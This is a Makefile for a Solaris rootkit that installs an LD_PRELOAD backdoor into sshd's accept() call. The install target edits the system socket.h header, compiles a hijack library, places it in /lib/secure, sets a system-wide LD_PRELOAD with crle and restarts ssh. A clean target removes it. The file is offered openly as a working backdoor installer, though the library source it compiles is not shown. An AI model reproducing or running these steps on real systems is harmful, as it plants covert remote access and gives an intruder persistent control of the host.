VERSION = v0.1
CC = gcc

all:
	@echo
	@echo "Installing Solaris LD_PRELOAD sshd accept() backdoor"
	@echo "by c papathanasiou & subere.. ;-)"
	@echo 
	@echo "Removing references to accept().."
	@cat /usr/include/sys/socket.h | grep -v "extern int accept">x
	@cat x>/usr/include/sys/socket.h
	@rm -rf x
	@echo "Done"
	@echo "Compiling..."
	@$(CC) -fPIC -shared src/libh*.c -o libhij.so
	@echo "Done"
	@echo "Moving libhij.so to /lib/secure"
	@mv libhij.so /lib/secure
	@echo "Disabling ssh.."
	@svcadm disable ssh
	@echo "Done"
	@echo "Running crle to set LD_PRELOAD environment.."
	@crle -E LD_PRELOAD=/lib/secure/libhij.so
	@echo "Done"
	@echo "Enabling ssh"
	@svcadm enable ssh
	@echo "M3rkd!!!"

clean:
	@rm -rf /var/ld/ld.config 
	@rm -rf /lib/secure/libh*.so	
	@echo "Restarting ssh daemon..."
	@svcadm disable ssh
	@svcadm enable ssh 
	@echo "rootkit removed.."

